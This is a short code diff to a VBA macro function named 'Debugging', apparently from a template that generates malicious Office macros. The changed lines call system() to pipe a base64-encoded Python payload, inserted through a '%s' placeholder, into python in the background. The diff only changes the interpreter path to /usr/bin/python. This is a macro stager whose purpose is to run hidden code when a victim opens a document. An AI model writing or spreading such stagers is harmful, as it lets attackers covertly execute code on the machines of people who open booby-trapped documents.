@@ -164,8 +164,8 @@ Public Function Debugging() As Variant
                 Dim result As Long
                 Dim str As String
                 %s
-                'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | python &")
-                result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | python &")
+                'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | /usr/bin/python &")
+                result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | /usr/bin/python &")
             #Else
                 'Windows Rendering
                 Dim objWeb As Object
